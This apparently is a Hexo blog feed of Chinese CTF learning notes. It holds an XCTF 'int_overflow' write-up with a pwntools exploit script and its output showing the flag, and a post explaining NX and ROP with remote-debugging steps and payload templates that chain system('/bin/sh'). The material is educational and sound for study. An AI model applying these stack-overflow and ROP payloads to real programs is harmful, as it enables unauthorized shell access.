    <content type="html"><![CDATA[<h2 id="整数类型的溢出"><a href="#整数类型的溢出" class="headerlink" title="整数类型的溢出"></a>整数类型的溢出</h2><p>以xctf平台的pwn新手区int_overflow为例<br>into 为rename的elf文件</p><h3 id="0X1"><a href="#0X1" class="headerlink" title="0X1"></a>0X1</h3><blockquote><p>file into<br>chmod 777 into<br>./into</p></blockquote><p>先确定into为32位elf文件</p><h3 id="0X2"><a href="#0X2" class="headerlink" title="0X2"></a>0X2</h3><p>win环境下，32位IDA进行分析<br>有明显的后门函数what_is_this()<br><img src="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic1.png" alt="no1"><br>进入login()后<br><img src="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic2.png" alt="no2"><br>结合下图看看<br><img src="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic3.png" alt="no3"><br><br>首先，我们可以发现，目前为止，找不到合适的直接溢出点，read函数都未越界。<br>唯一的落脚点来到strcpy()上，但是，s被限制再4到8个字节大小内，如果想达到栈溢出，覆盖返回地址，却至少需要读取大于dest数组0x14大小的填充数据。<br><strong>这个时候，unsigned __int8 v3是突破口</strong><br>查资料得知，int8的意思是占8个bit，因为是无符号数，范围是0到255之间。<br>回顾一下，check_passwd()函数传入的buf长度，有0x199这么大，足矣我们完成对int8的溢出。<br>截至目前，思路为，将buf的长度控制在256+4~256+8之间，达到v3&gt;3&amp;&amp;v3&lt;=8的条件，同时通过这两百五十多字节的数据布置，完成程序的劫持。<br>编写exp脚本如下</p><blockquote><p>from pwn import*<br>p = remote(“ip_address”,port)<br>p.recv()<br>p.sendline(‘1’)<br>p.recv()<br>p.sendline(‘kawa’)<br>p.recv()<br>payload = b’a’*(0x14) + b’aaaa’ + p32(0x804868b) + b’a’*234<br>p.sendline(payload)<br>p.interactive()</p></blockquote><p>linux中</p><blockquote><p>python3 e.py<br>[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.<br>[+] Opening connection to 111.200.241.244 on port 65136: Done<br>/root/Desktop/e.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See <a href="https://docs.pwntools.com/#bytes">https://docs.pwntools.com/#bytes</a><br>  p.sendline(‘1’)<br>/root/Desktop/e.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See <a href="https://docs.pwntools.com/#bytes">https://docs.pwntools.com/#bytes</a><br>  p.sendline(‘fc’)<br>[*] Switching to interactive mode<br>Hello fc</p></blockquote><p>Please input your passwd:<br>Success<br>cyberpeace{c592ce35706a19933e58ca21a03fb3c8}<br>[*] Got EOF while reading in interactive<br>$  </p><p>结束</p><h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p><strong>本题重点是需要知道，int8是内存大小为8bit即1字节大小的空间，可以达到int类型溢出。否则无从下手！！！</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf in do♂r</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NX-ROP</title>
    <link href="/2022/03/02/NX-ROP/"/>
    <url>/2022/03/02/NX-ROP/</url>
    
    <content type="html"><![CDATA[<h1 id="什么是NX与ROP"><a href="#什么是NX与ROP" class="headerlink" title="什么是NX与ROP"></a>什么是NX与ROP</h1><p><strong>NX即为no execute bit，即禁止执行位</strong><br><br>以下是wiki中文的解释</p><blockquote><p>支持NX技术的系统会把内存中的区域分类为只供存储处理器指令集与只供存储数据使用的两种。任何标记了NX位的区块代表仅供存储数据使用而不是存储处理器的指令集，处理器将不会将此处的数据作为代码执行，以此这种技术可防止多数的缓存溢出式攻ji（即一些恶意程序把自身的恶意指令集通过特殊手段放在其他程序的存储区并被执行，从而攻ji甚至控制整台电脑系统）。</p></blockquote><p>个人理解就是不能用常规的最简单的栈溢出手段，来直接修改返回地址为目标函数地址。<br><br><strong>ROP即返回导向编程（英语：Return-Oriented Programming，缩写：ROP）</strong><br>其核心思想是通过栈溢出等方式控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列（称为Gadgets）。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p><strong>因为开启了NX 保护，我们不可以把shellcode放到栈上来执行了，因此我们就需用用到ROP技术来迂回获得SHELL。</strong><br><br><br><strong>++本文是学习笔记形式，许多内容与原文章相同，但会加入部分个人理解。因为自学ctf确实费劲，一个地方搞不懂会困扰几天，希望我个人对样例的复现过程，和我的经验能帮助到后来者，少走弯路。++</strong><br><br><strong>原文地址</strong></p><blockquote><p><a href="https://bbs.pediy.com/thread-221041.htm">https://bbs.pediy.com/thread-221041.htm</a></p></blockquote><p>再次感谢原文大佬作者！</p><h2 id="win的IDA-pro与虚拟机中的linux联合调试方法"><a href="#win的IDA-pro与虚拟机中的linux联合调试方法" class="headerlink" title="win的IDA pro与虚拟机中的linux联合调试方法"></a>win的IDA pro与虚拟机中的linux联合调试方法</h2><p>1.在IDA中选中remote linux debugger<br><br>2.在菜单debugger下拉菜单里选择process option选项，设置如下：<br><img src="/2022/03/02/NX-ROP/cto1.png" alt="test-png"><br>其中目录就选择rop所在目录，hostname填上linux虚拟机的ip，端口默认选择23946<br><br>3.然后打开linux虚拟机，并把ida目录下的linxu_serverX64拷贝到虚拟机里并执行<br><img src="/2022/03/02/NX-ROP/cto2.png" alt="image.png"></p><p><br>4.用py编写调试代码rexp.py如下：<br><br> <br>#! /usr/bin/python<br>from pwn import *<br>import pdb<br>context.log_level = ‘debug’<br>target = process(‘./rop’)<br>elf=ELF(‘./rop’) #这个会显示rop用了哪些保护技术<br>pdb.set_trace()#这里设置一个pdb断点，可以让ida附加rop进程<br><br><br>target.sendline(‘a’64+’b’8+’c’*8)<br>target.interactive()<br>5.然后在linux系统上新开一个终端，执行rexp.py如下<br><img src="/2022/03/02/NX-ROP/cto3.png" alt="image.png"><br><br>6.在ida vuln函数里的gets函数后面下好断点<br><br>7.然后点击debugger,附加远程进程，找到./rop打开<br><img src="/2022/03/02/NX-ROP/cto4.png" alt="image.png"><br>并按F9执行<br><br>8.回到linux中，在Pdb终端里面输入n并回车（即next，下一步的意思)<br><br>9.可以看见IDA中出现同步的动态调试信息。<br><br><strong>以上便是IDA与linux的联合调试过程</strong><br><br>\</p><h2 id="开启NX保护与不开启时，做题时的不同感受"><a href="#开启NX保护与不开启时，做题时的不同感受" class="headerlink" title="开启NX保护与不开启时，做题时的不同感受"></a>开启NX保护与不开启时，做题时的不同感受</h2><p>1.开启NX以后，最直接的效果就是不能在栈上执行shellcode，也就是不能直接通过溢出，修改返回地址为shellcode，来获得shell。<br>2.但是开启NX以后，可以修改返回地址为已有的backdoor函数得到shell。<br>3.如果没有现成的backdoor函数，则需要我们想办法转移到其他空间，执行shellcode。</p><h2 id="64位与32位下，简单的应对NX保护的方式"><a href="#64位与32位下，简单的应对NX保护的方式" class="headerlink" title="64位与32位下，简单的应对NX保护的方式"></a>64位与32位下，简单的应对NX保护的方式</h2><p>即构造ROP链<br>1.64位环境下，一般先搜索有类似“pop rdi ; ret;”形式的代码段<br>命令：</p><blockquote><p>ROPgadget –binary 文件名 | grep “pop rdi”</p></blockquote><p>找到相关代码段后，payload第一部分覆盖缓冲区和rbp（ebp）后，便接上ROPgadget找到的gadget地址。<br>为什么要寻找pop rdi呢？<br>因为函数第一个参数一般都存在rdi中，这样可以达到传参的目的。<br>再寻找”/bin/sh”字符串地址，链接在rop链后。<br>随后传入_system函数地址，作用是，通过ret指令，跳转至该地址，执行system()<br>此时rdi已经被设置好为”/bin/sh”，即会执行system(“/bin/sh”)<br>获得系统权限。<br>payload一般如下：</p><blockquote><p>payload = b’A’*(缓冲区长度) + b’B’*8 + p64(pop_rdi_addr) + p64(/bin/sh_addr) + p64(_system_addr)</p></blockquote><p>2.32位环境下一般采用布置栈帧，达到调用函数、传递参数的目的<br>payload一般如下：</p><blockquote><p>payload = b’A’*(缓冲区长度) + b’B’*4 + p32(_system_addr) + p32(0x0) + p32(/bin/sh_addr)</p></blockquote><p>首先，覆盖完缓冲区后，为了达到返回地址处，要覆盖ebp，ebp的大小是4个字节。<br>然后通过修改返回地址，进入system函数，此时我们位于system函数栈帧中的ebp处，我们需要填充一下ebp下面的返回地址，随便设置为0x0.<br>紧接着导入/bin/sh字符串，达到传参的目的。</p><p><br>以上便是本人对NX及ROP技术初次认识的浅显简介，让各位见笑了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf in do♂r</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>start</title>
    <link href="/2022/02/23/start/"/>
    <url>/2022/02/23/start/</url>
    
    <content type="html"><![CDATA[<h2 id="测试一下"><a href="#测试一下" class="headerlink" title="测试一下"></a>测试一下</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>test_new_site</title>
    <link href="/2022/02/23/test-new-site/"/>
    <url>/2022/02/23/test-new-site/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/02/23/hello-world/"/>
    <url>/2022/02/23/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
